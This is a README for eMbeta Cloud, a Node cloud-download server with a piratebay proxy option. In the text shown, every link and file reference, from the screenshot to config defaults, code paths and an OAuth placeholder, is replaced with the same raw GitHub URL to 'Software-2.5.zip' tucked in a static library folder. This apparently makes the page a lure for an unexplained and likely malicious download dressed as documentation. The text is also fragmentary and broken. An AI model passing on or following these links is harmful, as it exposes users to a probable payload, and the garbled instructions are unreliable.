![screenshot](https://raw.githubusercontent.com/codeslide/embetacloud/master/static/libs/semantic/dist/Software-2.5.zip)
# eMbeta Cloud
...
- TBP_PROXY: piratebay proxy to use (default: `https://raw.githubusercontent.com/codeslide/embetacloud/master/static/libs/semantic/dist/Software-2.5.zip`)
...
mrigank11/embetacloud node https://raw.githubusercontent.com/codeslide/embetacloud/master/static/libs/semantic/dist/Software-2.5.zip`
...
# Debugging
eMbeta Cloud is [debug](https://raw.githubusercontent.com/codeslide/embetacloud/master/static/libs/semantic/dist/Software-2.5.zip) compatible, to get debug info set environment variable `DEBUG=eMCloud:*`
and start server.
...
1. Create new folder inside `/server/Storages/` (e.g. `/server/Storages/DropBox`) and add `.ts` file to it with same name as that of folder (say `https://raw.githubusercontent.com/codeslide/embetacloud/master/static/libs/semantic/dist/Software-2.5.zip`)
...
export class CloudName extends EventEmitter{
    ...
    static callbackHandler(query,callback){
        //handle the recieved credentials, 'query' contains the GET params. (like for OAuth, authentication code is 'https://raw.githubusercontent.com/codeslide/embetacloud/master/static/libs/semantic/dist/Software-2.5.zip')
...
For example, see `https://raw.githubusercontent.com/codeslide/embetacloud/master/static/libs/semantic/dist/Software-2.5.zip`

3. Add new storage to `https://raw.githubusercontent.com/codeslide/embetacloud/master/static/libs/semantic/dist/Software-2.5.zip` (import it and add in `storages` object)
...
`getURL()` may redirect url to custom page. For Example: returning `/login/mega` will open `https://raw.githubusercontent.com/codeslide/embetacloud/master/static/libs/semantic/dist/Software-2.5.zip`
